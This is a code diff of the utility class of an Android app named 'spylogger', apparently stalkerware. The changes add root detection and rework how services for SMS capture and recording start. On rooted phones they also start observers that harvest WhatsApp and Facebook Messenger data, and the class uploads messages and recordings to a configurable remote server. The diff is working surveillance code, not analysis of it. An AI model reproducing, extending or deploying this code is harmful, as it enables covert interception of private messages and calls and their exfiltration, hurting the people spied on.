@@ -49,6 +49,7 @@ import com.gravatasufoca.spylogger.services.WhatsAppService;
 import com.gravatasufoca.spylogger.vos.ContatoVO;
 import com.gravatasufoca.spylogger.vos.FcmMessageVO;
 import com.j256.ormlite.dao.Dao;
+import com.stericson.RootTools.RootTools;
 import com.utilidades.gravata.utils.Utilidades;
 
 import org.apache.commons.io.FileUtils;
@@ -79,13 +80,12 @@ import java.util.zip.ZipOutputStream;
 
 public class Utils {
 
-    public static final String MENSAGEM_RECEBIDA="MENSAGEM_RECEBIDA";
+    public static final String MENSAGEM_RECEBIDA = "MENSAGEM_RECEBIDA";
     public static final byte[] SALT = new byte[]{-32, 58, -52, 48, 15, -124, 123, 64, 60, -44, -122, -91, -23, 53, -23, 123, 44, -123, -111, 43};
 
     public static final String FACEBOOK_DIR_PATH = android.os.Environment.getDataDirectory().toString() + "/data/com.messenger.orca";
     public static final String NOT_PREMIUM = "<div class=\"center\"><div class=\"alert alert-warning section\">%s</div></div>";
     public static final String TOKEN = FirebaseInstanceId.getInstance().getToken();
-    public static boolean rooted;
 
     public static String[] permissoes = {
             Manifest.permission.GET_ACCOUNTS,
@@ -128,7 +128,7 @@ public class Utils {
     public static String COMPRADO = "potoca";
     public static String serverURL;
 
-//    public static Context context;
+    //    public static Context context;
     public static FileObserver observer;
 
     public static String getDeviceId(ContentResolver contentResolver) {
@@ -164,7 +164,7 @@ public class Utils {
     }
 
     public static void copyFile(File source, File dest) throws IOException {
-        FileUtils.copyFile(source,dest);
+        FileUtils.copyFile(source, dest);
     }
 
     public static void createFile(File dest, String msg) throws IOException {
@@ -545,7 +545,7 @@ public class Utils {
     }
 
 
-    public static Contact getContato(Context context,String userKey) throws SQLException {
+    public static Contact getContato(Context context, String userKey) throws SQLException {
         Dao<Contact, Integer> dao = (new DatabaseHelperFacebookContacts(context)).getContatosDao();
         String id = "";
         if (userKey.indexOf(":") != -1)
@@ -561,12 +561,12 @@ public class Utils {
     }
 
     public static boolean isServiceRunning(Context context) {
-        return  Utilidades.isServiceRunning(RecordService.class, context)
+        return Utilidades.isServiceRunning(RecordService.class, context)
                 && Utilidades.isServiceRunning(SmsService.class, context);
     }
 
-    public static boolean isDbObserverRunning(Context context){
-        return Utilidades.isServiceRunning(MensageiroObserversService.class,context);
+    public static boolean isDbObserverRunning(Context context) {
+        return Utilidades.isServiceRunning(MensageiroObserversService.class, context);
     }
 
     public static String getPercentualMensagem(String mensagem, int percentual) {
@@ -576,64 +576,55 @@ public class Utils {
         return mensagem.substring(0, tamanho);
     }
 
-    public static void startAlarm(final Context context, Configuracao configuracao) {
-
-        if (context != null && configuracao != null) {
-            if (alarm != null) {
-                alarm.cancelAlarm(context, pendingIntent);
-            }
-            Utils.alarm = new Alarm();
-
-            pendingIntent=Utils.alarm.setRepeatingAlarm(context, configuracao.getIntervalo(), new TaskComplete() {
-                @Override
-                public void onFinish(Object object) {
-                    Utils.enviarTudo(context);
-                }
-            });
-        }
+    public static boolean isRooted(){
+        return RootTools.isAccessGiven();
     }
 
 
     // Start the service
     public static void iniciarServicos(Context context, Configuracao configuracao) {
-        if (!Utils.isServiceRunning(context)) {
-            startServices(context);
-        }
-        if (rooted) {
-            startDbObserver(context);
-
-        }
-        startAlarm(context, configuracao);
+        startServices(context);
+        startMensageiros(context);
     }
 
     public static void primeiroStart(final Context context, Configuracao configuracao) {
-        if (!Utils.isServiceRunning(context)) {
-            startServices(context);
+        startServices(context);
+        startMensageiros(context);
+    }
+
+    public static void startMensageiros(final Context context) {
+        if (Utils.isRooted()) {
+            new MensageiroAsyncHelper(context, new TaskComplete() {
+                @Override
+                public void onFinish(Object object) {
+                    startDbObserver(context);
+                    Utils.enviarTudo(context);
+                }
+            }).execute(new WhatsAppService(context), new MessengerService(context));
         }
-       if (rooted){
-           new MensageiroAsyncHelper(context, new TaskComplete() {
-               @Override
-               public void onFinish(Object object) {
-                   startDbObserver(context);
-                   Utils.enviarTudo(context);
-               }
-           }).execute(new WhatsAppService(context),new MessengerService(context));
-       }
-       startAlarm(context, configuracao);
     }
 
     public static void startDbObserver(Context context) {
-        context.startService(new Intent(context, MensageiroObserversService.class));
+        startService(context, MensageiroObserversService.class);
     }
 
     public static void startServices(Context context) {
-        context.startService(new Intent(context, SmsService.class));
-        context.startService(new Intent(context, RecordService.class));
+        startService(context, SmsService.class);
+        startService(context, RecordService.class);
     }
 
-    public static void enviarTudo(Context context) {
+    public static void startService(Context context, Class clazz) {
         try {
-            Log.d("spylogger","enviarTudo");
+            context.stopService(new Intent(context, clazz));
+            context.startService(new Intent(context, clazz));
+        } catch (Exception e) {
+            Log.e("spylogger", e.getMessage());
+        }
+    }
+
+    public static synchronized void enviarTudo(Context context) {
+        try {
+            Log.d("spylogger", "enviarTudo");
             RepositorioConfiguracao repositorioConfiguracao = new RepositorioConfiguracaoImpl(context);
 
             Configuracao configuracao = repositorioConfiguracao.getConfiguracao();
@@ -648,7 +639,7 @@ public class Utils {
                     sendMensagensService.enviarTopicos();
 
                     if (configuracao.isWifi()) {
-                        Log.d("spylogger","esta no wifi");
+                        Log.d("spylogger", "esta no wifi");
                         if (status == NetworkUtil.NETWORK_STATUS_WIFI) {
                             SendGravacoesService sendGravacoesService = new SendGravacoesService(context, null);
                             sendGravacoesService.enviarTopicos();
@@ -677,15 +668,15 @@ public class Utils {
 
     public static String getServerUrl(Context context) {
         try {
-            RepositorioConfiguracao repositorioConfiguracao=new RepositorioConfiguracaoImpl(context);
-            Configuracao configuracao=repositorioConfiguracao.getConfiguracao();
+            RepositorioConfiguracao repositorioConfiguracao = new RepositorioConfiguracaoImpl(context);
+            Configuracao configuracao = repositorioConfiguracao.getConfiguracao();
             if (configuracao != null) {
-                String url=configuracao.getServerUrl();
-                String pos="/api/v1/";
-                if(!url.startsWith("http")){
-                    return "http://"+url+pos;
+                String url = configuracao.getServerUrl();
+                String pos = "/api/v1/";
+                if (!url.startsWith("http")) {
+                    return "http://" + url + pos;
                 }
-                return url+pos;
+                return url + pos;
             }
         } catch (SQLException e) {
             e.printStackTrace();
